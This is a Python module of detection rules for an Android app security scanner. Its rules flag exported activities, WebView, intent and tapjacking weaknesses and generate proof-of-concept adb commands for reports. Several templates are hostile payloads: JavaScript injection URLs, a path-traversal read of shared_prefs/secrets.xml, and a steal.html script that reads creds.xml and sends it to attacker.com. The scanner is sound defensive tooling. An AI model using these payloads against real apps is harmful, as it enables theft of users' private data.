"""Rules for detecting exported Activity vulnerabilities."""

from typing import List, Any, Optional

from .base_rule import BaseRule, Finding, Severity, Confidence, dalvik_to_java
from core.apk_parser import ANDROID_NS


class ExportedActivityRule(BaseRule):
    """Detect exported activities without proper permissions."""

    rule_id = "EXP-001"
    title = "Exported Activity Without Permission"
    severity = Severity.HIGH
    cwe = "CWE-926"
    description = "Activity is exported without requiring a permission, allowing any app to launch it."
    remediation = "Set android:exported=\"false\" or define a signature-level permission."
    references = (
        "https://cwe.mitre.org/data/definitions/926.html",
        "https://developer.android.com/guide/components/activities#Declaring"
    )

    def check(self) -> List[Finding]:
        """Check for exported activities without permissions."""
        findings = []
        activities = self.apk_parser.get_activities()
        min_sdk = self._safe_sdk_int(self.apk_parser.get_min_sdk())

        for activity in activities:
            if not activity['exported']:
                continue

            # Skip the launcher activity — it is intentionally exported as the app entry point
            is_launcher = any(
                'android.intent.action.MAIN' in f.get('actions', []) and
                'android.intent.category.LAUNCHER' in f.get('categories', [])
                for f in activity.get('intent_filters', [])
            )
            if is_launcher:
                continue

            # Check if protected by signature-level permission
            if self._is_protected(activity.get('permission')):
                continue

            # Determine confidence
            confidence = self._determine_confidence(activity['name'])

            # Generate exploit commands
            pkg = self.apk_parser.get_package_name()
            exploit_cmds = [
                f"adb shell am start -n {pkg}/{activity['name']}",
            ]
            # Only add VIEW action if this activity actually handles it
            handles_view = any(
                'android.intent.action.VIEW' in f.get('actions', [])
                for f in activity.get('intent_filters', [])
            )
            if handles_view:
                exploit_cmds.append(
                    f"adb shell am start -a android.intent.action.VIEW -n {pkg}/{activity['name']}"
                )

            finding = self.create_finding(
                component_name=activity['name'],
                confidence=confidence,
                exploit_commands=exploit_cmds,
                exploit_scenario=f"Any malicious app can launch {activity['name']} without restrictions.",
                api_level_affected=f"All (auto-export behavior changed at API 31)" if min_sdk <= 30 else "All"
            )
            findings.append(finding)

        return findings

    def _determine_confidence(self, activity_name: str) -> Confidence:
        """Determine confidence level based on taint analysis."""
        if self.taint_engine:
            # Check if tainted data from this activity reaches a dangerous sink
            for sink_pattern in ["loadUrl", "rawQuery", "execSQL", "exec(", "startActivity", "openFile"]:
                for path in self.taint_engine.get_paths_to_sink(sink_pattern):
                    if activity_name in path.source or activity_name in path.sink:
                        return Confidence.CONFIRMED

        return Confidence.LIKELY


class IntentToWebViewRule(BaseRule):
    """Detect intent data flowing to WebView.loadUrl() - CWE-939."""

    rule_id = "EXP-002"
    title = "Intent Data to WebView Load"
    severity = Severity.CRITICAL
    cwe = "CWE-939"
    component_type = "webview"
    description = "User-controlled intent data flows to WebView.loadUrl(), enabling XSS or open redirects."
    remediation = "Validate and sanitize URL data before loading. Use HTTPS allowlists."
    references = (
        "https://cwe.mitre.org/data/definitions/939.html",
        "https://labs.withsecure.com/publications/webview-security"
    )

    def check(self) -> List[Finding]:
        """Check for taint from getIntent() to loadUrl()."""
        findings = []

        if not self.taint_engine:
            return findings

        # Find paths from getIntent sources to loadUrl sinks
        taint_paths = self.taint_engine.get_paths_to_sink("loadUrl")

        for path in taint_paths:
            # Extract real class name from dalvik method signature.
            # Androguard full_name format: "Lcom/pkg/Class; methodName (desc)V"  (space-separated)
            # Fallback format:             "Lcom/pkg/Class;->methodName(desc)V"  (arrow-separated)
            component = dalvik_to_java(path.sink)

            exploit_cmds = [
                f"adb shell am start -n {self.apk_parser.get_package_name()}/{component} --es url 'javascript:alert(1)'",
                f"adb shell am start -n {self.apk_parser.get_package_name()}/{component} --es url 'https://attacker.com'"
            ]

            finding = self.create_finding(
                component_name=component,
                confidence=Confidence.CONFIRMED if path.confidence == "CONFIRMED" else Confidence.LIKELY,
                taint_path=self._format_taint_path(path),
                exploit_commands=exploit_cmds,
                exploit_scenario="Attacker can inject malicious URLs into WebView via intent extras.",
                api_level_affected="All"
            )
            findings.append(finding)

        return findings


class NestedIntentForwardingRule(BaseRule):
    """Detect StrandHogg 2.0 style nested intent forwarding - CWE-441."""

    rule_id = "EXP-003"
    title = "Nested Intent Forwarding (StrandHogg 2.0)"
    severity = Severity.CRITICAL
    cwe = "CWE-441"
    description = "Activity forwards received intents to other components without validation."
    remediation = "Validate intent data before forwarding. Use explicit intents with FLAG_IMMUTABLE."
    references = (
        "https://cwe.mitre.org/data/definitions/441.html",
        "https://www.promon.io/security-news/strandhogg-2-0"
    )

    def check(self) -> List[Finding]:
        """Check for intent forwarding patterns."""
        findings = []

        # Search for startActivity/startService with getIntent() data
        forwarding_sinks = ["startActivity", "startService", "startForegroundService"]

        for sink in forwarding_sinks:
            methods = self.callgraph.search_methods(sink) if self.callgraph else []
            for method_sig in methods:
                if "getIntent" in method_sig or "getParcelableExtra" in method_sig:
                    # Check if this is in an exported component
                    for activity in self.apk_parser.get_activities():
                        if activity['exported'] and activity['name'] in method_sig:
                            exploit_cmds = [
                                f"adb shell am start -n {self.apk_parser.get_package_name()}/{activity['name']} "
                                f"--ez android.intent.extra.START_FOREGROUND true"
                            ]

                            finding = self.create_finding(
                                component_name=activity['name'],
                                confidence=Confidence.LIKELY,
                                exploit_commands=exploit_cmds,
                                exploit_scenario="Malicious app can inject intent to be forwarded to privileged components.",
                                api_level_affected="All"
                            )
                            findings.append(finding)

        return findings


class TaskHijackingRule(BaseRule):
    """Detect task hijacking vulnerabilities (StrandHogg)."""

    rule_id = "EXP-020"
    title = "Task Hijacking Vulnerability (StrandHogg)"
    severity = Severity.CRITICAL
    cwe = "CWE-1021"
    description = "Activity allows task hijacking via taskAffinity and allowTaskReparenting."

    def check(self) -> List[Finding]:
        """Check for task hijacking patterns."""
        findings = []

        manifest = self.apk_parser.get_android_manifest_xml()
        if manifest is None:
            return findings

        activities = self.apk_parser.get_activities()

        for activity in activities:
            name = activity.get('name', '')

            if not activity.get('exported', False):
                continue

            launch_mode = self._get_activity_manifest_attr(name, "launchMode")
            task_affinity = self._get_activity_manifest_attr(name, "taskAffinity")

            if launch_mode in ["singleTask", "singleInstance"]:
                findings.append(self.create_finding(
                    component_name=name,
                    confidence=Confidence.LIKELY,
                    details={
                        "issue": "Launch mode allows task hijacking",
                        "launchMode": launch_mode,
                        "taskAffinity": task_affinity
                    },
                    code_snippet=f'android:launchMode="{launch_mode}"',
                    remediation="Avoid singleTask/singleInstance for exported activities. Use standard launchMode.",
                    exploit_commands=[
                        "# StrandHogg attack",
                        "adb shell am start -n malicious.app/.HijackActivity --taskAffinity com.target.app"
                    ]
                ))

        return findings

    def _get_activity_manifest_attr(self, activity_name: str, attr: str) -> Optional[str]:
        """Get a manifest attribute value for a named activity."""
        try:
            manifest = self.apk_parser.get_android_manifest_xml()
            if manifest is None:
                return None
            last_segment = activity_name.split('.')[-1]
            for activity in manifest.findall(".//activity"):
                name = activity.get(f"{{{ANDROID_NS}}}name")
                if name and (name == activity_name or name.endswith(last_segment)):
                    return activity.get(f"{{{ANDROID_NS}}}{attr}")
        except Exception:
            pass
        return None


class TapjackingVulnerabilityRule(BaseRule):
    """Detect tapjacking vulnerabilities."""

    rule_id = "EXP-021"
    title = "Tapjacking Vulnerability"
    severity = Severity.MEDIUM
    cwe = "CWE-1021"
    description = "Activity does not have filterTouchesWhenObscured, making it vulnerable to tapjacking."

    def check(self) -> List[Finding]:
        """Check for tapjacking protection on exported activities.

        Note: filterTouchesWhenObscured is a View layout attribute, not a manifest attribute.
        This rule flags exported activities as POSSIBLE and requires manual verification in
        layout XML files.
        """
        findings = []

        activities = self.apk_parser.get_activities()

        for activity in activities:
            name = activity.get('name', '')

            if not activity.get('exported', False):
                continue

            findings.append(self.create_finding(
                component_name=name,
                confidence=Confidence.POSSIBLE,
                details={
                    "issue": "Exported activity may lack tapjacking protection",
                    "action": "Verify android:filterTouchesWhenObscured=\"true\" in root view layout"
                },
                code_snippet='<!-- Add to root view in layout XML -->\nandroid:filterTouchesWhenObscured="true"',
                remediation="Add filterTouchesWhenObscured=\"true\" to the root view of sensitive activity layouts.",
                exploit_commands=[
                    "# Tapjacking cannot be triggered via ADB — it requires a crafted overlay APK.",
                    "# The attacker installs a malicious app that draws a transparent window",
                    "# (TYPE_APPLICATION_OVERLAY) on top of the target activity.",
                    "# When the victim taps the overlay, the touch passes through to the target.",
                    "#",
                    "# Step 1 — verify the layout does NOT set filterTouchesWhenObscured:",
                    "apktool d app.apk -o app_decoded",
                    "grep -r 'filterTouchesWhenObscured' app_decoded/res/layout/",
                    "# Step 2 — if absent, build a PoC overlay app with SYSTEM_ALERT_WINDOW,",
                    "# draw a TYPE_APPLICATION_OVERLAY window over the target activity,",
                    "# and confirm touches reach the target without user awareness.",
                ],
                exploit_scenario=(
                    f"{name} is exported and likely lacks filterTouchesWhenObscured. "
                    "An attacker app with SYSTEM_ALERT_WINDOW permission can draw a transparent "
                    "overlay on top of this activity. The victim interacts with the fake overlay "
                    "while unknowingly triggering actions (button clicks, permission grants) "
                    "in the hidden target activity beneath."
                ),
            ))

        return findings


class FragmentInjectionRule(BaseRule):
    """Detect fragment injection in PreferenceActivity subclasses - CWE-470."""

    rule_id = "EXP-030"
    title = "Fragment Injection via PreferenceActivity"
    severity = Severity.HIGH
    cwe = "CWE-470"
    description = (
        "Activity extends PreferenceActivity without overriding isValidFragment(), "
        "allowing any caller to load arbitrary Fragment classes."
    )
    remediation = (
        "Override isValidFragment() to return false for unknown fragment class names, "
        "or migrate to PreferenceFragmentCompat."
    )
    references = (
        "https://cwe.mitre.org/data/definitions/470.html",
        "https://developer.android.com/reference/android/preference/PreferenceActivity#isValidFragment(java.lang.String)",
    )

    def check(self) -> List[Finding]:
        findings = []

        if not self.callgraph:
            return findings

        # Find classes that extend PreferenceActivity
        pref_activity_methods = self.callgraph.search_methods("PreferenceActivity")
        is_valid_fragment_overrides = set(self.callgraph.search_methods("isValidFragment"))

        for method_sig in pref_activity_methods:
            # Extract class name from signature (format: "Lcom/pkg/Class;->method()")
            class_name = method_sig.split("->")[0] if "->" in method_sig else ""
            if not class_name:
                continue

            # Skip if this class overrides isValidFragment
            has_override = any(class_name in s for s in is_valid_fragment_overrides)
            if has_override:
                continue

            # Check if this class is an exported activity
            activities = self.apk_parser.get_activities()
            dalvik_name = dalvik_to_java(class_name)
            for activity in activities:
                if activity["name"] == dalvik_name and activity["exported"]:
                    findings.append(self.create_finding(
                        component_name=activity["name"],
                        confidence=Confidence.LIKELY,
                        exploit_commands=[
                            f"adb shell am start -n {self.apk_parser.get_package_name()}/{activity['name']} "
                            f"--es :android:show_fragment com.target.app.SensitiveFragment",
                            f"adb shell am start -n {self.apk_parser.get_package_name()}/{activity['name']} "
                            f"--es :android:show_fragment android.app.Fragment",
                        ],
                        exploit_scenario=(
                            f"Any app can load arbitrary Fragment classes via "
                            f"{activity['name']} without restriction."
                        ),
                        api_level_affected="API <= 28 (fixed in Android 9)",
                    ))

        return findings


class InsecureWebResourceResponseRule(BaseRule):
    """Detect shouldInterceptRequest returning arbitrary local files - CWE-73."""

    rule_id = "EXP-031"
    title = "Arbitrary File Read via WebResourceResponse"
    severity = Severity.HIGH
    cwe = "CWE-73"
    component_type = "webview"
    description = (
        "WebViewClient.shouldInterceptRequest() returns local files based on "
        "unvalidated URL input, allowing an attacker to read arbitrary app files."
    )
    remediation = (
        "Validate the URL scheme and path in shouldInterceptRequest(). "
        "Only serve files from a known safe directory and reject file:// schemes."
    )
    references = (
        "https://cwe.mitre.org/data/definitions/73.html",
        "https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md",
    )

    def check(self) -> List[Finding]:
        findings = []

        if not self.callgraph:
            return findings

        intercept_methods = self.callgraph.search_methods("shouldInterceptRequest")

        for method_sig in intercept_methods:
            # Check if this method also reads a file (openAsset / openFileInput / File)
            callees = self.callgraph.get_callees(method_sig)
            reads_file = any(
                kw in callee for callee in callees
                for kw in ("openAsset", "openFileInput", "FileInputStream", "openFile")
            )
            if not reads_file:
                continue

            class_name = dalvik_to_java(method_sig)
            findings.append(self.create_finding(
                component_name=class_name or "WebViewClient",
                confidence=Confidence.LIKELY,
                code_snippet=(
                    "@Override\n"
                    "public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {\n"
                    "    // Returns local file based on request URL — validate path!\n"
                    "}"
                ),
                exploit_commands=[
                    "# Load a malicious URL in the app's WebView that triggers file read",
                    "adb shell am start -a android.intent.action.VIEW "
                    "-d 'target-scheme://path?file=../../../../shared_prefs/secrets.xml'",
                ],
                exploit_scenario=(
                    "Attacker loads a crafted URL in the WebView causing "
                    "shouldInterceptRequest to serve an arbitrary local file."
                ),
                api_level_affected="All",
            ))

        return findings


class JavaScriptBridgeRule(BaseRule):
    """Detect insecure JavaScript bridge in WebView."""

    rule_id = "EXP-023"
    title = "Insecure WebView JavaScript Bridge"
    severity = Severity.HIGH
    cwe = "CWE-749"
    component_type = "webview"
    description = "WebView has JavaScript enabled with exposed bridge allowing code execution."

    def check(self) -> List[Finding]:
        """Check for WebView JavaScript bridge."""
        findings = []

        if not self.callgraph:
            return findings

        bridge_methods = self.callgraph.search_methods("addJavascriptInterface")
        pkg = self.apk_parser.get_package_name()

        for method in bridge_methods:
            # Extract Java class name from signature (supports both -> and space formats)
            class_name = dalvik_to_java(method) or "Application"

            # Look up whether this class is a directly launchable exported activity
            exported_activities = {a["name"] for a in self.apk_parser.get_activities() if a.get("exported")}
            launch_target = class_name if class_name in exported_activities else None

            if launch_target:
                exploit_cmds = [
                    f"# {class_name} exposes a JavaScript bridge — launch it and inject JS",
                    f"adb shell am start -n {pkg}/{launch_target} --es url 'javascript:window._native_interface.toString()'",
                    f"# Enumerate all bridge methods:",
                    f"adb shell am start -n {pkg}/{launch_target} --es url "
                    f"'javascript:alert(Object.getOwnPropertyNames(window).filter(k=>typeof window[k]==\"object\").join(\",\"))'",
                ]
            else:
                exploit_cmds = [
                    f"# {class_name} exposes a JavaScript bridge",
                    f"# Load a page containing this WebView and inject:",
                    f"javascript:window._native_interface.toString()",
                    f"# Or enumerate bridge objects:",
                    f"javascript:alert(Object.getOwnPropertyNames(window).filter(k=>typeof window[k]==\"object\").join(\",\"))",
                ]

            findings.append(self.create_finding(
                component_name=class_name,
                confidence=Confidence.CONFIRMED,
                details={
                    "issue": "JavaScript bridge exposed",
                    "method": method
                },
                code_snippet='webView.addJavascriptInterface(new JsBridge(), "_native_interface");',
                remediation="Remove @JavascriptInterface methods or validate origin. Use Chrome Custom Tabs instead.",
                exploit_commands=exploit_cmds,
            ))

        return findings


class WebViewFileAccessRule(BaseRule):
    """Detect WebView with file:// cross-origin access enabled - CWE-200."""

    rule_id = "EXP-036"
    title = "WebView Universal File Access Enabled"
    severity = Severity.CRITICAL
    cwe = "CWE-200"
    component_type = "webview"
    description = (
        "WebView has setAllowUniversalAccessFromFileURLs(true) or "
        "setAllowFileAccessFromFileURLs(true), allowing file:// pages to read "
        "arbitrary files from the device including app private data."
    )
    remediation = (
        "Set setAllowUniversalAccessFromFileURLs(false) and "
        "setAllowFileAccessFromFileURLs(false). These default to false on API 16+. "
        "Never enable them in production."
    )
    references = (
        "https://cwe.mitre.org/data/definitions/200.html",
        "https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs(boolean)",
    )

    def check(self) -> List[Finding]:
        findings = []

        if not self.callgraph:
            return findings

        pkg = self.apk_parser.get_package_name()

        # Check both the universal access flag and the weaker file-to-file flag
        # exploit_cmds are built inside the loop so the actual class_name is used.
        checks = [
            (
                "setAllowUniversalAccessFromFileURLs",
                Confidence.CONFIRMED,
                Severity.CRITICAL,
                "Allows any file:// page to read ALL files the app can access — "
                "equivalent to a full same-origin policy bypass.",
            ),
            (
                "setAllowFileAccessFromFileURLs",
                Confidence.LIKELY,
                Severity.HIGH,
                "Allows file:// pages to read other file:// URIs — "
                "an attacker can read any file the app has access to via a crafted local HTML page.",
            ),
        ]

        seen: set = set()
        for api_name, confidence, severity, scenario in checks:
            callers = self.callgraph.search_methods(api_name)
            for caller_sig in callers:
                if caller_sig in seen:
                    continue

                # Confirm the call passes `true` — check callees for a boolean true literal.
                # Androguard doesn't expose argument values easily from the callgraph alone,
                # so we flag all callers and note that manual verification is needed if
                # the confidence is LIKELY.
                seen.add(caller_sig)
                class_name = dalvik_to_java(caller_sig)

                # Build exploit commands using the actual class name found in the APK
                if api_name == "setAllowUniversalAccessFromFileURLs":
                    exploit_cmds = [
                        "# Push a crafted HTML file that reads app private data",
                        "adb push steal.html /sdcard/steal.html",
                        f"adb shell am start -a android.intent.action.VIEW "
                        f"-d 'file:///sdcard/steal.html' -n {pkg}/{class_name}",
                        "# steal.html content:",
                        f"# <script>fetch('file:///data/data/{pkg}/shared_prefs/creds.xml')"
                        ".then(r=>r.text()).then(d=>location='https://attacker.com/?d='+btoa(d))</script>",
                    ]
                else:
                    exploit_cmds = [
                        "# Push a crafted HTML that reads another local file",
                        "adb push steal.html /sdcard/steal.html",
                        f"adb shell am start -a android.intent.action.VIEW "
                        f"-d 'file:///sdcard/steal.html' -n {pkg}/{class_name}",
                        "# steal.html: <script>var x=new XMLHttpRequest();"
                        f"x.open('GET','file:///data/data/{pkg}/databases/app.db',false);"
                        "x.send();alert(x.responseText)</script>",
                    ]

                # Build finding via create_finding then override severity,
                # avoiding mutation of shared self.severity.
                finding = self.create_finding(
                    component_name=class_name,
                    confidence=confidence,
                    code_snippet=(
                        f"webView.getSettings().{api_name}(true);  // DANGEROUS — remove this line"
                    ),
                    exploit_commands=exploit_cmds,
                    exploit_scenario=scenario,
                    api_level_affected="All (defaulted to false since API 16)",
                )
                finding.severity = severity
                finding.cvss_score = {
                    Severity.CRITICAL: 9.0, Severity.HIGH: 7.5,
                }.get(severity, 5.0)
                findings.append(finding)

        return findings


class IntentRedirectionRule(BaseRule):
    """Detect intent redirection — exported component forwards attacker-controlled intent - CWE-926."""

    rule_id = "EXP-037"
    title = "Intent Redirection (Privilege Escalation)"
    severity = Severity.CRITICAL
    cwe = "CWE-926"
    component_type = "activity"
    description = (
        "An exported component retrieves a nested Intent from extras "
        "(getParcelableExtra / getSerializableExtra) and passes it directly to "
        "startActivity() / startService() without validation. An attacker can "
        "supply an arbitrary Intent targeting internal components."
    )
    remediation = (
        "Never start components using an Intent obtained from untrusted extras. "
        "If forwarding is necessary, use an explicit allowlist of permitted target "
        "components and strip dangerous flags (FLAG_GRANT_READ_URI_PERMISSION etc.)."
    )
    references = (
        "https://cwe.mitre.org/data/definitions/926.html",
        "https://blog.oversecured.com/Android-Intent-Redirection/",
    )

    # Sources that extract a nested Intent from an incoming intent
    _NESTED_INTENT_SOURCES = (
        "getParcelableExtra",
        "getSerializableExtra",
        "getBundleExtra",
    )

    def check(self) -> List[Finding]:
        findings = []

        if not self.taint_engine:
            return findings

        pkg = self.apk_parser.get_package_name()

        # Find taint paths from nested-intent sources to startActivity / startService
        redirect_sinks = ["startActivity", "startService", "startForegroundService"]

        for sink in redirect_sinks:
            for path in self.taint_engine.get_paths_to_sink(sink):
                # Only flag if the source involves extracting a nested Intent
                if not any(src in path.source for src in self._NESTED_INTENT_SOURCES):
                    continue

                # Extract class name from dalvik sink signature
                component = dalvik_to_java(path.sink)

                # Only flag if the component is an exported activity or service
                all_components = (
                    self.apk_parser.get_activities() + self.apk_parser.get_services()
                )
                is_exported = any(
                    c["exported"] and c["name"] == component
                    for c in all_components
                )
                if not is_exported:
                    continue

                findings.append(self.create_finding(
                    component_name=component,
                    confidence=Confidence.CONFIRMED if path.confidence == "CONFIRMED" else Confidence.LIKELY,
                    taint_path=self._format_taint_path(path),
                    code_snippet=(
                        "// Vulnerable pattern:\n"
                        "Intent nested = getIntent().getParcelableExtra(\"extra_intent\");\n"
                        "startActivity(nested);  // attacker controls the target"
                    ),
                    exploit_commands=[
                        f"# Launch exported activity with a nested intent targeting an internal component",
                        f"adb shell am start -n {pkg}/{component} \\",
                        f"  --ep extra_intent 'intent:#Intent;component={pkg}/.InternalActivity;"
                        f"action=android.intent.action.MAIN;end'",
                        f"# Or target a protected broadcast receiver",
                        f"adb shell am start -n {pkg}/{component} \\",
                        f"  --ep extra_intent 'intent:#Intent;component={pkg}/.AdminReceiver;end'",
                    ],
                    exploit_scenario=(
                        f"Attacker sends an intent to exported {component} with a nested "
                        f"Intent extra pointing to {pkg}'s internal components. The app "
                        f"forwards it via {sink}(), granting the attacker access to "
                        f"components that would otherwise be inaccessible."
                    ),
                    api_level_affected="All",
                ))

        return findings
